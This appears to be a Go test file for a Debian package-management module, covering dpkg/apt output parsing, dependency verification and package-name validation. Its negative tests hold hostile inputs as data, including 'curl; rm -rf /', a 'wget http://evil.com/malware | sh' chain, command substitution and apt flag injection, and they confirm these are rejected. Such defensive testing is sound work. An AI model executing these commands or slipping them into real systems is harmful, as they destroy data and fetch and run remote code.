package packages

import (
	"context"
	"os"
	"strings"
	"testing"
)

// ---------------------------------------------------------------------------
// Helpers that mirror the logic inside packages.go but accept a string reader
// instead of running exec commands.  These let us feed fixture text without
// touching apt / dpkg.
// ---------------------------------------------------------------------------

// parseInstalledLines is the same loop used in ListInstalled.
func parseInstalledLines(raw string) []Package {
	var pkgs []Package
	for _, line := range strings.Split(strings.TrimSpace(raw), "\n") {
		if line == "" {
			continue
		}
		fields := strings.SplitN(line, "\t", 3)
		p := Package{Installed: true}
		if len(fields) >= 1 {
			p.Name = fields[0]
		}
		if len(fields) >= 2 {
			p.Version = fields[1]
		}
		if len(fields) >= 3 {
			p.Description = fields[2]
		}
		if p.Name == "" || strings.HasPrefix(p.Name, " ") {
			continue
		}
		pkgs = append(pkgs, p)
	}
	return pkgs
}

// parseSearchLines mirrors the scanner loop in Search.
func parseSearchLines(raw string, installed map[string]bool) []Package {
	var pkgs []Package
	for _, line := range strings.Split(raw, "\n") {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		name, desc, _ := strings.Cut(line, " - ")
		name = strings.TrimSpace(name)
		pkgs = append(pkgs, Package{
			Name:        name,
			Description: strings.TrimSpace(desc),
			Installed:   installed[name],
		})
	}
	return pkgs
}

// parseAptCacheShow mirrors GetInfo's parsing loop.
func parseAptCacheShow(raw string) map[string]string {
	info := make(map[string]string)
	for _, line := range strings.Split(raw, "\n") {
		if idx := strings.Index(line, ": "); idx > 0 {
			key := strings.TrimSpace(line[:idx])
			val := strings.TrimSpace(line[idx+2:])
			if key != "" && val != "" {
				info[key] = val
			}
		}
	}
	info["raw"] = raw
	return info
}

// buildInstallArgs mirrors how Install builds the exec args.
func buildInstallArgs(name string) []string {
	return []string{"apt-get", "install", "-y", "--no-install-recommends", name}
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

// Fixture: typical dpkg-query -W output
const dpkgFixture = `bash	5.2.15-2+b7	GNU Bourne Again SHell
curl	7.88.1-10+deb12u8	command line tool for transferring data with URL syntax
 broken-continuation line should be skipped
vim	2:9.0.1378-2	Vi IMproved - enhanced vi editor
`

func TestParseInstalled_Count(t *testing.T) {
	pkgs := parseInstalledLines(dpkgFixture)
	if len(pkgs) != 3 {
		t.Fatalf("expected 3 packages, got %d", len(pkgs))
	}
}

func TestParseInstalled_Fields(t *testing.T) {
	pkgs := parseInstalledLines(dpkgFixture)
	if pkgs[0].Name != "bash" {
		t.Errorf("name: want bash, got %q", pkgs[0].Name)
	}
	if pkgs[0].Version != "5.2.15-2+b7" {
		t.Errorf("version: want 5.2.15-2+b7, got %q", pkgs[0].Version)
	}
	if pkgs[0].Description != "GNU Bourne Again SHell" {
		t.Errorf("desc: want GNU Bourne Again SHell, got %q", pkgs[0].Description)
	}
}

func TestParseInstalled_InstalledFlag(t *testing.T) {
	for _, p := range parseInstalledLines(dpkgFixture) {
		if !p.Installed {
			t.Errorf("package %q should be marked installed", p.Name)
		}
	}
}

func TestParseInstalled_SkipContinuationLines(t *testing.T) {
	// The fixture has one " broken-continuation line" — it must be skipped.
	pkgs := parseInstalledLines(dpkgFixture)
	for _, p := range pkgs {
		if strings.HasPrefix(p.Name, " ") {
			t.Errorf("continuation line leaked through: %q", p.Name)
		}
	}
}

func TestParseInstalled_Empty(t *testing.T) {
	if got := parseInstalledLines(""); got != nil {
		t.Errorf("expected nil slice for empty input, got %v", got)
	}
}

// Fixture: apt-cache search output
const searchFixture = `bash - GNU Bourne Again SHell
curl - command line tool for transferring data with URL syntax
libssl3 - Secure Sockets Layer toolkit - shared libraries
`

func TestParseSearch_Count(t *testing.T) {
	pkgs := parseSearchLines(searchFixture, nil)
	if len(pkgs) != 3 {
		t.Fatalf("expected 3, got %d", len(pkgs))
	}
}

func TestParseSearch_NameDesc(t *testing.T) {
	pkgs := parseSearchLines(searchFixture, nil)
	if pkgs[1].Name != "curl" {
		t.Errorf("want curl, got %q", pkgs[1].Name)
	}
	if pkgs[1].Description != "command line tool for transferring data with URL syntax" {
		t.Errorf("unexpected desc: %q", pkgs[1].Description)
	}
}

func TestParseSearch_InstalledFlag(t *testing.T) {
	installed := map[string]bool{"bash": true}
	pkgs := parseSearchLines(searchFixture, installed)
	for _, p := range pkgs {
		want := p.Name == "bash"
		if p.Installed != want {
			t.Errorf("package %q installed=%v, want %v", p.Name, p.Installed, want)
		}
	}
}

// Fixture: apt-cache show output
const aptCacheShowFixture = `Package: curl
Version: 7.88.1-10+deb12u8
Architecture: amd64
Maintainer: Alessandro Ghedini <ghedo@debian.org>
Description: command line tool for transferring data with URL syntax
`

func TestParseAptCacheShow_Fields(t *testing.T) {
	info := parseAptCacheShow(aptCacheShowFixture)
	if info["Package"] != "curl" {
		t.Errorf("Package: want curl, got %q", info["Package"])
	}
	if info["Version"] != "7.88.1-10+deb12u8" {
		t.Errorf("Version mismatch: %q", info["Version"])
	}
	if info["Architecture"] != "amd64" {
		t.Errorf("Architecture mismatch: %q", info["Architecture"])
	}
}

func TestParseAptCacheShow_RawPresent(t *testing.T) {
	info := parseAptCacheShow(aptCacheShowFixture)
	if info["raw"] == "" {
		t.Error("raw key should be present")
	}
}

func TestParseAptCacheShow_EmptyInput(t *testing.T) {
	info := parseAptCacheShow("")
	if len(info) != 1 || info["raw"] != "" {
		t.Errorf("unexpected keys in empty parse: %v", info)
	}
}

// ---------------------------------------------------------------------------
// Install-command builder — verifies no shell injection is possible.
// ---------------------------------------------------------------------------

func TestBuildInstallArgs_Basic(t *testing.T) {
	args := buildInstallArgs("curl")
	if args[0] != "apt-get" {
		t.Errorf("binary: want apt-get, got %q", args[0])
	}
	if args[len(args)-1] != "curl" {
		t.Errorf("last arg should be package name, got %q", args[len(args)-1])
	}
}

func TestBuildInstallArgs_NoShellExpansion(t *testing.T) {
	// A malicious name with shell metacharacters must arrive as a literal arg,
	// not be interpreted by a shell.  Since exec.Command is used (not sh -c),
	// the package name is passed verbatim — we just verify it lands in args[].
	evil := "curl; rm -rf /"
	args := buildInstallArgs(evil)
	if args[len(args)-1] != evil {
		t.Errorf("shell injection guard: arg should be literal, got %q", args[len(args)-1])
	}
	// There must be no shell binary in the command.
	for _, a := range args {
		if a == "sh" || a == "bash" || a == "-c" {
			t.Errorf("shell invocation detected in args: %v", args)
		}
	}
}

// ---------------------------------------------------------------------------
// DEPS-01 / DEPS-02 — `deps` is VERIFIED, never installed.
//
// The two tests that used to live here were TestBuildInstallDepsArgs_* and
// they are replaced rather than deleted, because neither one touched shipping
// code: one asserted the argument list built by a MIRROR function defined in
// this test file, and the other reduced to `if len([]string{}) == 0 { return }`
// — a test that passes whatever InstallDeps does, including not existing. That
// is this repo's dominant defect (roadmap/vulos-guards-that-check-nothing), and
// swapping them for assertions against the real function is the whole trade.
// ---------------------------------------------------------------------------

// TestVerifyDeps_EmptyIsNoOp is the CONTROL. Without it, a VerifyDeps that
// refused everything would pass every negative test below it and look correct.
func TestVerifyDeps_EmptyIsNoOp(t *testing.T) {
	if err := VerifyDeps(context.Background(), nil); err != nil {
		t.Errorf("nil deps refused: %v — a recipe with no dependencies must install", err)
	}
	if err := VerifyDeps(context.Background(), []string{}); err != nil {
		t.Errorf("empty deps refused: %v", err)
	}
}

// TestVerifyDeps_MissingPackageIsAnError is the assertion DEPS-01 exists for.
// The name is one no distribution ships, so it is missing on every platform:
// on a box with dpkg-query it is "not installed", on a box without it the
// answer is unknowable — and BOTH are errors, which is the point. A skip on
// the second would be the hollow-guard shape.
func TestVerifyDeps_MissingPackageIsAnError(t *testing.T) {
	err := VerifyDeps(context.Background(), []string{"vulos-no-such-package-deps01"})
	if err == nil {
		t.Fatal("a dependency no box carries was reported SATISFIED — that is DEPS-01: " +
			"the install then reports success for an app whose first exec dies with " +
			"\"error while loading shared libraries\"")
	}
	if !strings.Contains(err.Error(), "vulos-no-such-package-deps01") &&
		!strings.Contains(err.Error(), "dpkg-query") {
		t.Errorf("the refusal names neither the package nor the missing tool: %v", err)
	}
}

// TestVerifyDeps_ReportsTheMissingOnes drives VerifyDeps with real dpkg output
// through the depStatusQuery seam.
//
// This test exists because the FIRST version of it did not, and a mutation
// found the hole: `if len(missing) > 0` was replaced with `if false` — VerifyDeps
// reporting nothing missing, ever — and the suite stayed GREEN. On macOS there
// is no dpkg-query, so every call returned ErrNoPackageDB before the missing
// list was ever consulted, and TestVerifyDeps_MissingPackageIsAnError was
// passing for a reason that had nothing to do with the package. The assertion
// looked like a result. Feeding fixtures through the seam is what makes the
// accumulate-and-report branch reachable on a machine with no dpkg.
//
// Every fixture line below was copied from real `dpkg-query -W -f
// '${Status}\t${Version}'` output measured in debian:trixie-slim on 2026-08-17.
func TestVerifyDeps_ReportsTheMissingOnes(t *testing.T) {
	fixture := map[string]string{
		"liburing2":       "install ok installed\t2.9-1",
		"ca-certificates": "deinstall ok config-files\t20250419", // removed; conffiles remain
		"git":             "",                                    // dpkg has never heard of it
	}
	orig := depStatusQuery
	depStatusQuery = func(ctx context.Context, name string) (string, error) {
		return fixture[name], nil
	}
	defer func() { depStatusQuery = orig }()

	// The satisfied case must pass, or every assertion below it is about a
	// function that refuses everything.
	if err := VerifyDeps(context.Background(), []string{"liburing2"}); err != nil {
		t.Errorf("an INSTALLED package was reported missing: %v", err)
	}

	err := VerifyDeps(context.Background(), []string{"liburing2", "ca-certificates", "git"})
	if err == nil {
		t.Fatal("DEPS-01: two of three declared dependencies are not on the box and VerifyDeps " +
			"reported them satisfied")
	}
	for _, want := range []string{"ca-certificates", "git", "config-files"} {
		if !strings.Contains(err.Error(), want) {
			t.Errorf("the refusal does not mention %q — it must name which dependency is "+
				"missing and what dpkg says about it: %v", want, err)
		}
	}
	if strings.Contains(err.Error(), "liburing2") {
		t.Errorf("the refusal names liburing2, which IS installed: %v", err)
	}
	if !strings.Contains(err.Error(), "2 of 3") {
		t.Errorf("the refusal does not count the missing ones (want \"2 of 3\"): %v", err)
	}
}

// TestVerifyDeps_NoPackageDBIsItsOwnAnswer keeps the two unanswerable-vs-absent
// cases apart. A box with no dpkg cannot say whether a package is installed,
// and reporting that as "your dependency is missing" would send whoever reads
// it looking for a package that may well be there.
func TestVerifyDeps_NoPackageDBIsItsOwnAnswer(t *testing.T) {
	orig := depStatusQuery
	depStatusQuery = func(ctx context.Context, name string) (string, error) {
		return "", ErrNoPackageDB
	}
	defer func() { depStatusQuery = orig }()

	err := VerifyDeps(context.Background(), []string{"liburing2"})
	if err == nil {
		t.Fatal("a box that cannot answer the question reported the dependency satisfied — " +
			"that is a guard that checks nothing")
	}
	if !strings.Contains(err.Error(), "dpkg-query") {
		t.Errorf("the refusal does not say the TOOL is missing, so it reads as a missing "+
			"package: %v", err)
	}
}

// TestVerifyDeps_RejectsFlagInjection keeps SEC-PKG-01 answering for the new
// function too: a dep name is passed to an exec'd command, so the allowlist
// must still run. A leading '-' would otherwise become a dpkg-query flag.
func TestVerifyDeps_RejectsFlagInjection(t *testing.T) {
	for _, bad := range []string{"--admindir=/tmp", "-W", "curl; rm -rf /", "pkg$(id)"} {
		if err := VerifyDeps(context.Background(), []string{bad}); err == nil {
			t.Errorf("VerifyDeps accepted %q", bad)
		}
	}
}

// TestDepUnsatisfied_ReadsRealDpkgStatus feeds depUnsatisfied the exact lines
// `dpkg-query -W -f '${Status}\t${Version}'` produced in a debian:trixie-slim
// container on 2026-08-17. The two states that matter most are the ones that
// LOOK installed: "deinstall ok config-files" is a removed package whose
// conffiles remain — dpkg still knows it, `dpkg -l` still lists it, and its
// shared libraries are gone.
func TestDepUnsatisfied_ReadsRealDpkgStatus(t *testing.T) {
	cases := []struct {
		name      string
		line      string
		wantVer   string
		versioned bool
		satisfied bool
	}{
		{"installed", "install ok installed\t20250419", "", false, true},
		{"installed with matching version", "install ok installed\t2.9-1", "2.9-1", true, true},
		{"installed with wrong version", "install ok installed\t2.9-1", "2.8-1", true, false},
		{"purged but conffiles remain", "deinstall ok config-files\t20250419", "", false, false},
		{"known but never installed", "unknown ok not-installed\t", "", false, false},
		{"interrupted unpack", "install ok half-installed\t2.9-1", "", false, false},
		{"unpacked, not configured", "install ok unpacked\t2.9-1", "", false, false},
		{"empty output", "", "", false, false},
	}
	for _, c := range cases {
		why := depUnsatisfied(c.line, c.wantVer, c.versioned)
		if (why == "") != c.satisfied {
			t.Errorf("%s: depUnsatisfied(%q) = %q, satisfied=%v want satisfied=%v",
				c.name, c.line, why, why == "", c.satisfied)
		}
	}
}

// TestNoAptInstallManyRemains is the structural half. VerifyDeps could be
// perfect and the hole would still be one line away for as long as a function
// that apt-get-installs a LIST lives in this package: `deps` is a list, and
// wiring it back is a single call. Reading the source is the only way to
// assert about a function that is supposed to not exist.
func TestNoAptInstallManyRemains(t *testing.T) {
	src, err := os.ReadFile("packages.go")
	if err != nil {
		t.Fatalf("read packages.go: %v", err)
	}
	text := string(src)
	// Sanity first: if this file is not the one that holds the package API,
	// every assertion below passes vacuously.
	if !strings.Contains(text, "func VerifyDeps(") || !strings.Contains(text, "func Install(") {
		t.Fatal("packages.go does not hold VerifyDeps and Install — this guard is reading the wrong file")
	}
	var code []string
	for _, line := range strings.Split(text, "\n") {
		if i := strings.Index(line, "//"); i >= 0 {
			line = line[:i]
		}
		code = append(code, line)
	}
	body := strings.Join(code, "\n")

	if strings.Contains(body, "func InstallDeps(") {
		t.Error("InstallDeps is back. It was the last package-manager call in the install path " +
			"(INSTALL-METHODOLOGY §4.6) and it cannot work on a shipped box: build.sh clears the " +
			"apt lists, so `apt-get install -y liburing2` exits 100 with \"Unable to locate package\".")
	}
	// Install(name string) legitimately shells apt-get for the user-driven
	// Packages screen. What must not come back is the variadic form, because
	// that is the shape a recipe's `deps` slice plugs into.
	if strings.Contains(body, `"install", "-y", "--no-install-recommends"}, deps...)`) {
		t.Error("a function still expands a deps SLICE into `apt-get install` args")
	}
	// VerifyDeps itself must never reach apt.
	start := strings.Index(body, "func VerifyDeps(")
	end := strings.Index(body[start:], "\n}\n")
	if end < 0 {
		t.Fatal("could not delimit VerifyDeps")
	}
	if strings.Contains(body[start:start+end], "apt-get") {
		t.Error("VerifyDeps calls apt-get — it is supposed to VERIFY, not install")
	}
}

// ---------------------------------------------------------------------------
// SEC-PKG-01: Package name validation — flag injection prevention
// ---------------------------------------------------------------------------

// TestValidatePkgName_AcceptsValid verifies that well-formed Debian package names
// pass the allowlist regexp.
func TestValidatePkgName_AcceptsValid(t *testing.T) {
	valid := []string{
		"curl",
		"vim",
		"libssl3",
		"python3-pip",
		"apt-transport-https",
		"lib32gcc-s1",
		"linux-image-6.1.0-21-amd64",
	}
	for _, name := range valid {
		if err := validatePkgName(name); err != nil {
			t.Errorf("validatePkgName(%q) returned unexpected error: %v", name, err)
		}
	}
}

// TestValidatePkgName_RejectsFlagInjection verifies that names starting with '-'
// (which would be interpreted as apt-get flags) are rejected.
func TestValidatePkgName_RejectsFlagInjection(t *testing.T) {
	dangerous := []string{
		"--allow-unauthenticated",
		"--force-yes",
		"-y",
		"-o APT::Get::Assume-Yes=true",
	}
	for _, name := range dangerous {
		if err := validatePkgName(name); err == nil {
			t.Errorf("validatePkgName(%q) should return error (flag injection)", name)
		}
	}
}

// TestValidatePkgName_RejectsShellMetachars verifies that metacharacters used
// in shell command injection attempts are rejected.
func TestValidatePkgName_RejectsShellMetachars(t *testing.T) {
	dangerous := []string{
		"curl; rm -rf /",
		"curl && wget http://evil.com/malware | sh",
		"$(evil_command)",
		"`evil`",
		"curl\nwget evil",
		"../../../etc/evil.deb",
	}
	for _, name := range dangerous {
		if err := validatePkgName(name); err == nil {
			t.Errorf("validatePkgName(%q) should return error (shell metachar)", name)
		}
	}
}

// TestInstall_ValidatesName ensures Install rejects dangerous package names
// without invoking apt-get.
func TestInstall_ValidatesName(t *testing.T) {
	ctx := context.Background()
	if err := Install(ctx, "--allow-unauthenticated"); err == nil {
		t.Error("Install should reject --allow-unauthenticated (flag injection)")
	}
	if err := Install(ctx, "curl; rm -rf /"); err == nil {
		t.Error("Install should reject 'curl; rm -rf /' (shell injection)")
	}
}

// TestRemove_ValidatesName ensures Remove rejects dangerous package names.
func TestRemove_ValidatesName(t *testing.T) {
	ctx := context.Background()
	if err := Remove(ctx, "--force-yes"); err == nil {
		t.Error("Remove should reject --force-yes (flag injection)")
	}
}

// ---------------------------------------------------------------------------
// Repo line parsing (mirrors readRepos inner logic, no filesystem access).
// ---------------------------------------------------------------------------

func parseRepoLines(data string) []Repo {
	var repos []Repo
	for _, line := range strings.Split(data, "\n") {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		enabled := !strings.HasPrefix(line, "#")
		url := strings.TrimPrefix(line, "#")
		url = strings.TrimSpace(url)
		if strings.HasPrefix(url, "deb ") || strings.HasPrefix(url, "deb-src ") {
			repos = append(repos, Repo{URL: url, Enabled: enabled})
		}
	}
	return repos
}

const sourcesListFixture = `deb http://deb.debian.org/debian bookworm main
# deb-src http://deb.debian.org/debian bookworm main
deb http://security.debian.org/debian-security bookworm-security main

# This is a comment, not a repo
deb-src http://deb.debian.org/debian bookworm-updates main
`

func TestParseRepoLines_Count(t *testing.T) {
	repos := parseRepoLines(sourcesListFixture)
	if len(repos) != 4 {
		t.Fatalf("expected 4 repos, got %d", len(repos))
	}
}

func TestParseRepoLines_EnabledDisabled(t *testing.T) {
	repos := parseRepoLines(sourcesListFixture)
	// Second entry is commented out
	if repos[1].Enabled {
		t.Error("commented-out repo should have Enabled=false")
	}
	if !repos[0].Enabled {
		t.Error("first repo should have Enabled=true")
	}
}

func TestParseRepoLines_URLPreservation(t *testing.T) {
	repos := parseRepoLines(sourcesListFixture)
	want := "deb http://deb.debian.org/debian bookworm main"
	if repos[0].URL != want {
		t.Errorf("URL: want %q, got %q", want, repos[0].URL)
	}
}
